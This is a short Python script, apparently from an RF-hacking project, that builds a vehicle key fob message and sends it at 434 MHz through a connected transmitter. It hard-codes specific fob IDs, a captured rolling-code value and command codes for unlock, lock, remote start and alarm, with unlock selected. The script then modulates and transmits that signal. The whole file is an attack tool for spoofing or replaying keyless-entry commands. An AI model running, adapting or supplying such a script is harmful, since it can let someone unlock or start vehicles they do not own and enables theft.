#!/usr/bin/python3
from tooling.stage import run_stager
from tooling.modulate import run_modulate
from tooling.transmit import run_transmit
import os

#CONFIGURATION HERE
msg_preamble = b'\xFF' #1 byte, always seems to be \xFF
msg_fobid = b'\xFE\x37\xC3\x8F' #4 bytes, MSB has consistently been \xFE, FOB1=fe.37.c3.8f FOB2=fe.3e.25.ef
msg_cmd = b'\x42\x41\x04' #3 bytes, command code, unlock is 42.41.04, lock is 42.40.44, rstart is 42.48.04, alarm is 42.40.24
msg_rolling = b'\x0C\x4D\xF9\x28\x26\xF2' #6 bytes, probably a rolling code, always increases over time

carrier_frequency = 434e6 #carrier frequency to modulate at
transmission_db = 10 #tx RF power

#EXECUTION STARTS HERE
#Stage bistream
print(f'[!] Staging command sequence:\n\tFobID: 0x{msg_fobid.hex()}\n\tCommandSequence: \
0x{msg_cmd.hex()}\n\tRollingCode: 0x{msg_rolling.hex()}')
returned_bit_count = run_stager(msg_preamble, msg_fobid, msg_cmd, msg_rolling)
print(f'[+] Done, generated {returned_bit_count} bits\n')

print(f'[+] Performing ASK Modulation at {carrier_frequency/1e6}MHz')
run_modulate(carrier_frequency)
print(f'[+] Done, generated {round(os.path.getsize("runtime/wave.bin")/1e6)}MB waveform\n')

print(f'[+] Attempting transmission at {transmission_db}dB')
try:
    run_transmit(carrier_frequency)
    print(f'[+] Done')
except RuntimeError:
    print(f'[!] Could not find connected device')
